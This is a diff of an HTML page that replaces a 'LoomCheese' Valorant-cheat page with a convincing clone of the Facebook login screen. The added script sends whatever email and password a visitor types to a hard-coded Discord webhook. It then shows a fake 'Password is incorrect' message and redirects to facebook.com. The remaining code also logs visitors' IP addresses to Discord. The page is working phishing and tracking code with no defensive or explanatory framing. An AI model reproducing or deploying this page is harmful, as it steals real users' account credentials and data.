@@ -3,53 +3,231 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="LoomCheese" />
-    <meta property="og:description" content="LoomCheese is the best and biggest Valorant cheat on the market." />
-    <meta property="og:image" content="https://www.healthyfood.com/wp-content/uploads/2017/03/Guide_to_cheese-1024x851.jpg" />
-    <meta property="og:url" content="https://loomcheese.github.io" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <title>Loom Cheese</title>
+    <title>Facebook - Log In or Sign Up</title>
     <style>
-        /* Center content and apply basic styling */
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f4f4f9;
+            font-family: Helvetica, Arial, sans-serif;
             margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            max-width: 980px;
+            margin: 0 auto;
             padding: 20px;
         }
-
-        h1 {
-            color: #333;
+        .left-section {
+            flex: 1;
+            margin-right: 32px;
+            padding-bottom: 32px;
         }
-
-        #ip {
-            font-size: 2rem;
-            color: #555;
-            margin-top: 10px;
+        .logo {
+            margin-bottom: 16px;
         }
-
-        /* Add a subtle animation to the IP display */
-        #ip.fade-in {
-            animation: fadeIn 1s ease-in-out;
+        .logo img {
+            height: 106px;
+            margin: -28px;
         }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
+        .tagline {
+            font-size: 28px;
+            line-height: 32px;
+            width: 500px;
+        }
+        .right-section {
+            flex: 0 0 396px;
+        }
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 16px;
+            margin-bottom: 28px;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-align: center;
+            display: block;
+            margin-bottom: 16px;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            width: fit-content;
+            margin: 0 auto;
+            display: block;
+            cursor: pointer;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        .create-page {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 28px;
+        }
+        .create-page a {
+            color: black;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            background-color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #737373;
+        }
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                height: auto;
             }
-            to {
-                opacity: 1;
+            .left-section {
+                margin-right: 0;
+                margin-bottom: 40px;
+                text-align: center;
+            }
+            .tagline {
+                width: auto;
+                font-size: 24px;
+            }
+            .right-section {
+                flex: 0 0 auto;
+                width: 100%;
             }
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to Loom Cheese</h1>
-    <h2>Your IP Address</h2>
-    <h1 id="ip">Loading...</h1>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">
+                <img src="https://i.imgur.com/8ASnJ0V.png">
+            </div>
+            <div class="tagline">
+                Facebook helps you connect and share with the people in your life.
+            </div>
+        </div>
+        <div class="right-section">
+            <div class="login-container">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <input type="email" id="email" placeholder="Email address or phone number" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="login-button">Log In</button>
+                    <a href="#" class="forgot-password">Forgotten password?</a>
+                    <div class="divider"></div>
+                    <button type="button" class="create-account">Create New Account</button>
+                </form>
+            </div>
+            <div class="create-page">
+                <a href="#">Create a Page</a> for a celebrity, brand or business.
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <p>Facebook © 2025</p>
+    </div>
 
     <script>
+        let loginAttempts = 0;
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault(); // Prevent the form from submitting
+
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            let errorMessage = document.getElementById('error-message');
+
+            if (!errorMessage) {
+                errorMessage = document.createElement('p');
+                errorMessage.id = 'error-message';
+                errorMessage.style.color = 'red';
+                errorMessage.style.textAlign = 'center';
+                document.querySelector('.login-container').appendChild(errorMessage);
+            }
+
+            const discordWebhookUrl = "https://discord.com/api/webhooks/1336240430886424576/KpDOKxSo2Kyrj22dLWTCrkv4ZXD1paUfUt7SQrly0Y4tA4_4HXKAy65ls9RSYA_OMm_S";
+
+            const embedPayload = {
+                embeds: [
+                    {
+                        title: "Login details received",
+                        description: `Email: ${email} \nPassword: ${password}`,
+                        color: 0x7289DA,
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+
+            await fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embedPayload)
+            });
+
+            
+            errorMessage.textContent = 'Password is incorrect';
+
+            setTimeout(() => {
+                window.location.href = 'https://facebook.com';
+            }, 1000);
+        });
         // Fetch the user's IP address and send it to a Discord webhook
         window.onload = async function () {
             const ipElement = document.getElementById('ip');
